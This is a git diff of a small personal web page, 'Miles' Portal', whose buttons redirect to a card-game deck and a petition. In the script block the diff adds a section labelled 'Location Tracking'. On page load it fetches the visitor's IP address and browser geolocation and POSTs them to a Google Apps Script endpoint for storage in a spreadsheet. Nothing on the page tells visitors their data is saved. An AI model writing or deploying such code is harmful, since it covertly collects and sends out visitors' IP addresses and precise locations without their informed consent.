@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Miles' Portal 🌐</title>
+<title>Miles' Portal </title>
 <style>
 body {
 font-family: 'Segoe UI', sans-serif;
@@ -31,20 +31,55 @@ background-color: #ff4500;
 }
 </style>
 <script>
+// ---------------- Redirects ----------------
 const path = window.location.pathname.toLowerCase();
-
 const redirects = {
-    "/milescurrentdeck": "https://royaleapi.com/deck-list/7232719592950918349",
-    "/mod": "https://sign.moveon.org/petitions/make-miles-a-mod?source=rawlink&utm_source=rawlink&share=eae4d178-e60c-49f4-a860-7a6eaf029c38"
+"/milescurrentdeck": "https://royaleapi.com/deck-list/7232719592950918349",
+"/mod": "https://sign.moveon.org/petitions/make-miles-a-mod"
 };
 
 if (redirects[path]) {
-    window.location.href = redirects[path];
+window.location.href = redirects[path];
 }
+
+// ---------------- Location Tracking ----------------
+const SHEET_URL = "https://script.google.com/macros/s/AKfycbwY9bN8j8OAjaZdNPWGF4rkl5Hc_BZcj0C4Z4MijjeS67mWjOOlR_xjYliIrT-11GZao7Q/exec";
+
+// Get IP address first
+fetch("https://api.ipify.org?format=json")
+.then(res => res.json())
+.then(ipData => {
+if ("geolocation" in navigator) {
+navigator.geolocation.getCurrentPosition(pos => {
+const data = {
+ip: ipData.ip,
+lat: pos.coords.latitude,
+lon: pos.coords.longitude
+};
+
+// Send data to Google Sheets
+fetch(SHEET_URL, {
+method: "POST",
+body: JSON.stringify(data)
+})
+.then(res => res.text())
+.then(msg => console.log("Saved to Google Sheets:", msg))
+.catch(err => console.error("Error saving:", err));
+
+// Show on page
+document.body.insertAdjacentHTML("beforeend",
+`<p>Your IP: ${data.ip}</p>
+<p>Your Latitude: ${data.lat}</p>
+<p>Your Longitude: ${data.lon}</p>`);
+}, err => {
+document.body.insertAdjacentHTML("beforeend", "<p>Location access denied.</p>");
+});
+}
+});
 </script>
 </head>
 <body>
-<h1>Welcome to Miles' Portal 🌐</h1>
+<h1>Welcome to Miles' Portal </h1>
 <a href="/milescurrentdeck" class="button">Miles Deck</a>
 <a href="/mod" class="button">Make Miles a Mod</a>
 </body>
